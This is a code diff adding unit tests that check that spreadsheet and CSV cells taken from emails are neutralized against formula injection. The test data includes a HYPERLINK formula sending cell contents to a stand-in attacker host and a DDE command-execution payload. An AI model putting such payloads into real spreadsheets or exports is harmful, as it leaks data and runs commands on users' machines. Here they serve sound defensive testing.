@@ -94,3 +94,19 @@ async def test_monitor_prompt_shows_workbook_rows(monkeypatch) -> None:
     )
     assert "Header: Supplier,Product,Price,Qty,Value" in prompt
     assert "1: Acme,SOP,520,20," in prompt
+
+
+def test_formulas_from_emails_are_stored_as_text() -> None:
+    evil = '=HYPERLINK("https://evil.example/?d="&A1:A50,"Track")'
+    out, added, _ = file_monitor.apply_xlsx_changes(_table(), [["Evil Co", evil, "1", "1", ""]], [])
+    sheet = openpyxl.load_workbook(io.BytesIO(out)).active
+    assert added == 1 and sheet["B3"].value == evil and sheet["B3"].data_type == "s"
+    assert sheet["E3"].value == "=C3*D3"  # the sheet's own row formula is kept
+
+
+def test_csv_cells_from_emails_are_neutralized() -> None:
+    content, added, _ = file_monitor.apply_changes(
+        "a,b\n1,2\n", [["=cmd|' /C calc'!A0", "-5"], ["@SUM(1)", "+x"]], []
+    )
+    assert "'=cmd" in content and "'@SUM(1)" in content and "'+x" in content
+    assert ",-5" in content  # negative numbers are left alone
